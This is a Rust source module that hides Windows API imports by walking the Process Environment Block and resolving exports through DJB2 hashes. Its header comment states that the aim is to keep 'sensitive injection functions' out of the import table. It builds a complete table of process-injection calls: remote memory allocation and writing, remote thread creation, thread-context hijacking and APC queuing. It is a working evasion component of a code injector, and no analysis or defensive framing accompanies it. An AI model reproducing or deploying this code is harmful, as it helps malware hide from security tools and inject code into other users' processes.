//! API hashing via PEB walk + DJB2.
//! Sensitive injection functions are resolved at runtime — they never appear in the binary's IAT.

use std::sync::OnceLock;

// ── DJB2 hash (compile-time for function names, runtime for wide DLL names) ──

const fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        h = h.wrapping_mul(33).wrapping_add(s[i] as u32);
        i += 1;
    }
    h
}

const fn djb2_lower(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        let b = s[i];
        let c = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
        h = h.wrapping_mul(33).wrapping_add(c as u32);
        i += 1;
    }
    h
}

// Module name hashes (case-insensitive, matches PEB wide-char DLL names)
const H_KERNEL32:  u32 = djb2_lower(b"kernel32.dll");
#[allow(dead_code)]
const H_NTDLL:     u32 = djb2_lower(b"ntdll.dll");

// Function name hashes (exact case — export table names are case-sensitive)
const H_OPEN_PROCESS:           u32 = djb2(b"OpenProcess");
const H_VIRTUAL_ALLOC_EX:       u32 = djb2(b"VirtualAllocEx");
const H_VIRTUAL_PROTECT_EX:     u32 = djb2(b"VirtualProtectEx");
const H_WRITE_PROCESS_MEMORY:   u32 = djb2(b"WriteProcessMemory");
const H_READ_PROCESS_MEMORY:    u32 = djb2(b"ReadProcessMemory");
const H_CREATE_REMOTE_THREAD:   u32 = djb2(b"CreateRemoteThread");
const H_WAIT_FOR_SINGLE_OBJECT: u32 = djb2(b"WaitForSingleObject");
const H_CLOSE_HANDLE:           u32 = djb2(b"CloseHandle");
const H_CREATE_THREAD:          u32 = djb2(b"CreateThread");
const H_VIRTUAL_ALLOC:          u32 = djb2(b"VirtualAlloc");
const H_VIRTUAL_PROTECT:        u32 = djb2(b"VirtualProtect");
const H_OPEN_THREAD:            u32 = djb2(b"OpenThread");
const H_SUSPEND_THREAD:         u32 = djb2(b"SuspendThread");
const H_RESUME_THREAD:          u32 = djb2(b"ResumeThread");
const H_GET_THREAD_CONTEXT:     u32 = djb2(b"GetThreadContext");
const H_SET_THREAD_CONTEXT:     u32 = djb2(b"SetThreadContext");
const H_QUEUE_USER_APC:         u32 = djb2(b"QueueUserAPC");
const H_TERMINATE_PROCESS:      u32 = djb2(b"TerminateProcess");
const H_CREATE_PROCESS_W:       u32 = djb2(b"CreateProcessW");
const H_LOAD_LIBRARY_A:         u32 = djb2(b"LoadLibraryA");
const H_GET_PROC_ADDRESS:       u32 = djb2(b"GetProcAddress");

// ── API table ────────────────────────────────────────────────────────────────

pub struct ApiTable {
    open_process:           usize,
    virtual_alloc_ex:       usize,
    virtual_protect_ex:     usize,
    write_process_memory:   usize,
    read_process_memory:    usize,
    create_remote_thread:   usize,
    wait_for_single_object: usize,
    close_handle:           usize,
    create_thread:          usize,
    virtual_alloc:          usize,
    virtual_protect:        usize,
    open_thread:            usize,
    suspend_thread:         usize,
    resume_thread:          usize,
    get_thread_context:     usize,
    set_thread_context:     usize,
    queue_user_apc:         usize,
    terminate_process:      usize,
    create_process_w:       usize,
    load_library_a:         usize,
    get_proc_address:       usize,
}

impl ApiTable {
    pub unsafe fn open_process(&self, access: u32, inherit: i32, pid: u32) -> isize {
        let f: unsafe extern "system" fn(u32, i32, u32) -> isize = std::mem::transmute(self.open_process);
        f(access, inherit, pid)
    }
    pub unsafe fn virtual_alloc_ex(&self, proc: isize, addr: *const core::ffi::c_void, sz: usize, alloc: u32, prot: u32) -> *mut core::ffi::c_void {
        let f: unsafe extern "system" fn(isize, *const core::ffi::c_void, usize, u32, u32) -> *mut core::ffi::c_void = std::mem::transmute(self.virtual_alloc_ex);
        f(proc, addr, sz, alloc, prot)
    }
    pub unsafe fn virtual_protect_ex(&self, proc: isize, addr: *const core::ffi::c_void, sz: usize, new_prot: u32, old_prot: *mut u32) -> i32 {
        let f: unsafe extern "system" fn(isize, *const core::ffi::c_void, usize, u32, *mut u32) -> i32 = std::mem::transmute(self.virtual_protect_ex);
        f(proc, addr, sz, new_prot, old_prot)
    }
    pub unsafe fn write_process_memory(&self, proc: isize, base: *const core::ffi::c_void, buf: *const core::ffi::c_void, sz: usize, written: *mut usize) -> i32 {
        let f: unsafe extern "system" fn(isize, *const core::ffi::c_void, *const core::ffi::c_void, usize, *mut usize) -> i32 = std::mem::transmute(self.write_process_memory);
        f(proc, base, buf, sz, written)
    }
    pub unsafe fn read_process_memory(&self, proc: isize, base: *const core::ffi::c_void, buf: *mut core::ffi::c_void, sz: usize, read: *mut usize) -> i32 {
        let f: unsafe extern "system" fn(isize, *const core::ffi::c_void, *mut core::ffi::c_void, usize, *mut usize) -> i32 = std::mem::transmute(self.read_process_memory);
        f(proc, base, buf, sz, read)
    }
    pub unsafe fn create_remote_thread(&self, proc: isize, sec: *const core::ffi::c_void, stack_sz: usize, start: *const core::ffi::c_void, param: *const core::ffi::c_void, flags: u32, tid: *mut u32) -> isize {
        let f: unsafe extern "system" fn(isize, *const core::ffi::c_void, usize, *const core::ffi::c_void, *const core::ffi::c_void, u32, *mut u32) -> isize = std::mem::transmute(self.create_remote_thread);
        f(proc, sec, stack_sz, start, param, flags, tid)
    }
    pub unsafe fn wait_for_single_object(&self, handle: isize, ms: u32) -> u32 {
        let f: unsafe extern "system" fn(isize, u32) -> u32 = std::mem::transmute(self.wait_for_single_object);
        f(handle, ms)
    }
    pub unsafe fn close_handle(&self, handle: isize) -> i32 {
        let f: unsafe extern "system" fn(isize) -> i32 = std::mem::transmute(self.close_handle);
        f(handle)
    }
    pub unsafe fn create_thread(&self, sec: *const core::ffi::c_void, stack: usize, start: *const core::ffi::c_void, param: *const core::ffi::c_void, flags: u32, tid: *mut u32) -> isize {
        let f: unsafe extern "system" fn(*const core::ffi::c_void, usize, *const core::ffi::c_void, *const core::ffi::c_void, u32, *mut u32) -> isize = std::mem::transmute(self.create_thread);
        f(sec, stack, start, param, flags, tid)
    }
    pub unsafe fn virtual_alloc(&self, addr: *const core::ffi::c_void, sz: usize, alloc: u32, prot: u32) -> *mut core::ffi::c_void {
        let f: unsafe extern "system" fn(*const core::ffi::c_void, usize, u32, u32) -> *mut core::ffi::c_void = std::mem::transmute(self.virtual_alloc);
        f(addr, sz, alloc, prot)
    }
    pub unsafe fn virtual_protect(&self, addr: *const core::ffi::c_void, sz: usize, new_prot: u32, old_prot: *mut u32) -> i32 {
        let f: unsafe extern "system" fn(*const core::ffi::c_void, usize, u32, *mut u32) -> i32 = std::mem::transmute(self.virtual_protect);
        f(addr, sz, new_prot, old_prot)
    }
    pub unsafe fn open_thread(&self, access: u32, inherit: i32, tid: u32) -> isize {
        let f: unsafe extern "system" fn(u32, i32, u32) -> isize = std::mem::transmute(self.open_thread);
        f(access, inherit, tid)
    }
    pub unsafe fn suspend_thread(&self, handle: isize) -> u32 {
        let f: unsafe extern "system" fn(isize) -> u32 = std::mem::transmute(self.suspend_thread);
        f(handle)
    }
    pub unsafe fn resume_thread(&self, handle: isize) -> u32 {
        let f: unsafe extern "system" fn(isize) -> u32 = std::mem::transmute(self.resume_thread);
        f(handle)
    }
    pub unsafe fn get_thread_context(&self, handle: isize, ctx: *mut core::ffi::c_void) -> i32 {
        let f: unsafe extern "system" fn(isize, *mut core::ffi::c_void) -> i32 = std::mem::transmute(self.get_thread_context);
        f(handle, ctx)
    }
    pub unsafe fn set_thread_context(&self, handle: isize, ctx: *const core::ffi::c_void) -> i32 {
        let f: unsafe extern "system" fn(isize, *const core::ffi::c_void) -> i32 = std::mem::transmute(self.set_thread_context);
        f(handle, ctx)
    }
    pub unsafe fn queue_user_apc(&self, func: *const core::ffi::c_void, thread: isize, data: usize) -> u32 {
        let f: unsafe extern "system" fn(*const core::ffi::c_void, isize, usize) -> u32 = std::mem::transmute(self.queue_user_apc);
        f(func, thread, data)
    }
    pub unsafe fn terminate_process(&self, proc: isize, code: u32) -> i32 {
        let f: unsafe extern "system" fn(isize, u32) -> i32 = std::mem::transmute(self.terminate_process);
        f(proc, code)
    }
}

pub static API: OnceLock<ApiTable> = OnceLock::new();

pub fn init() {
    API.get_or_init(|| unsafe { resolve_all() });
}

pub fn get() -> Option<&'static ApiTable> {
    API.get()
}

// ── PEB walk ─────────────────────────────────────────────────────────────────

unsafe fn peb_get_module(dll_hash: u32) -> usize {
    let peb: usize;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    if peb == 0 { return 0; }

    let ldr = *((peb + 0x18) as *const usize);
    if ldr == 0 { return 0; }

    let list_head = ldr + 0x10;
    let mut flink = *(list_head as *const usize);

    while flink != 0 && flink != list_head {
        // LDR_DATA_TABLE_ENTRY (x64):
        // +0x30 DllBase, +0x58 BaseDllName.Length, +0x60 BaseDllName.Buffer
        let dll_base = *((flink + 0x30) as *const usize);
        let name_len = *((flink + 0x58) as *const u16);
        let name_buf = *((flink + 0x60) as *const usize);

        if dll_base != 0 && name_buf != 0 && name_len > 0 {
            let h = hash_wide_lower(name_buf as *const u16, name_len);
            if h == dll_hash { return dll_base; }
        }
        flink = *(flink as *const usize);
    }
    0
}

fn hash_wide_lower(buf: *const u16, len_bytes: u16) -> u32 {
    let len = (len_bytes / 2) as usize;
    let mut h: u32 = 5381;
    for i in 0..len {
        let wc = unsafe { *buf.add(i) };
        let lo = (wc & 0xFF) as u8;
        let c  = if lo >= b'A' && lo <= b'Z' { lo + 32 } else { lo };
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}

unsafe fn resolve_export(base: usize, fn_hash: u32) -> usize {
    if base == 0 { return 0; }
    if *(base as *const u16) != 0x5A4D { return 0; }
    let e_lfanew = *((base + 0x3C) as *const u32) as usize;
    let nt = base + e_lfanew;
    if *(nt as *const u32) != 0x0000_4550 { return 0; }

    // Export directory: OptionalHeader at nt+0x18, DataDirectory[0] at OptHdr+0x70 → nt+0x88
    let exp_rva = *((nt + 0x88) as *const u32) as usize;
    if exp_rva == 0 { return 0; }
    let exp = base + exp_rva;

    let num_names  = *((exp + 0x18) as *const u32) as usize;
    let fn_arr     = base + *((exp + 0x1C) as *const u32) as usize;
    let name_arr   = base + *((exp + 0x20) as *const u32) as usize;
    let ord_arr    = base + *((exp + 0x24) as *const u32) as usize;

    for i in 0..num_names {
        let name_rva = *((name_arr + i * 4) as *const u32) as usize;
        let name_ptr = (base + name_rva) as *const u8;

        let mut h: u32 = 5381;
        let mut j = 0usize;
        loop {
            let b = *name_ptr.add(j);
            if b == 0 { break; }
            h = h.wrapping_mul(33).wrapping_add(b as u32);
            j += 1;
        }

        if h == fn_hash {
            let ord    = *((ord_arr + i * 2) as *const u16) as usize;
            let fn_rva = *((fn_arr  + ord * 4) as *const u32) as usize;
            return base + fn_rva;
        }
    }
    0
}

unsafe fn resolve_all() -> ApiTable {
    let k32 = peb_get_module(H_KERNEL32);
    let r = |h| resolve_export(k32, h);

    ApiTable {
        open_process:           r(H_OPEN_PROCESS),
        virtual_alloc_ex:       r(H_VIRTUAL_ALLOC_EX),
        virtual_protect_ex:     r(H_VIRTUAL_PROTECT_EX),
        write_process_memory:   r(H_WRITE_PROCESS_MEMORY),
        read_process_memory:    r(H_READ_PROCESS_MEMORY),
        create_remote_thread:   r(H_CREATE_REMOTE_THREAD),
        wait_for_single_object: r(H_WAIT_FOR_SINGLE_OBJECT),
        close_handle:           r(H_CLOSE_HANDLE),
        create_thread:          r(H_CREATE_THREAD),
        virtual_alloc:          r(H_VIRTUAL_ALLOC),
        virtual_protect:        r(H_VIRTUAL_PROTECT),
        open_thread:            r(H_OPEN_THREAD),
        suspend_thread:         r(H_SUSPEND_THREAD),
        resume_thread:          r(H_RESUME_THREAD),
        get_thread_context:     r(H_GET_THREAD_CONTEXT),
        set_thread_context:     r(H_SET_THREAD_CONTEXT),
        queue_user_apc:         r(H_QUEUE_USER_APC),
        terminate_process:      r(H_TERMINATE_PROCESS),
        create_process_w:       r(H_CREATE_PROCESS_W),
        load_library_a:         r(H_LOAD_LIBRARY_A),
        get_proc_address:       r(H_GET_PROC_ADDRESS),
    }
}
